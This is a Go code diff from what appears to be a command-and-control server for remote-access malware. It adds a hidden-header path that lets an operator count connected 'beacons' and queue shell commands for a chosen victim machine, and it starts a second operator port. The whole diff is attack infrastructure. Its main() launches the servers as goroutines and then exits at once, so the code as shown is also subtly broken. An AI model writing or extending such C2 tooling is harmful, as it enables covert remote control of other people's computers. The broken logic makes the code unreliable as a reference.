@@ -61,22 +61,47 @@ func Listener_Handler(w http.ResponseWriter, r *http.Request, listener *Listener
 		defer r.Body.Close()
 		w.WriteHeader(http.StatusOK)
 
-		res, love := POST_handler(body, listener, r)
-		if !love {
-			http.Error(w, fmt.Sprintf("Forbidden: bad regist or not get"), http.StatusForbidden)
-			return
-		} else {
-			w.Write(res)
-			res = make([]byte, 0)
-		}
+		if headers.Get("IAMFROM") == "C2AUTH" {
+			var res []byte
+			switch Check_Command(body) {
+			case 0:
+				break
+			case BEACONS:
+				tmp := len(listener.Beacons)
+				res = append(res, IntToUint8(tmp))
+				Send_Bytes_to(w, res, "http://localhost:50049", expectedHeaders)
+				res = make([]byte, 0)
+				break
+			case SHELL:
+				body = body[4:]
+				id := int(body[0])
+				var job Job
+				job.command = uint16(body[1])<<8 | uint16(body[2])
+				job.shell = string(body[3:])
+				job.funny = true
 
+				listener.Beacons[id].jobs = append(listener.Beacons[id].jobs, job)
+			}
+
+		} else {
+			res, love := POST_handler(body, listener, r, w)
+			if !love {
+				http.Error(w, fmt.Sprintf("Forbidden: bad regist or not get"), http.StatusForbidden)
+				return
+			} else {
+				w.Write(res)
+				res = make([]byte, 0)
+			}
+		}
 	}
 }
 
 func main() {
 	uri := ""
-	port := 8080
+	port1 := 8080
+	port2 := 50050
 	lisname := "ilovec2"
-	StartListener(uri, port, lisname)
+	go StartListener(uri, port1, lisname)
+	go StartClient(uri, port2)
 
 }
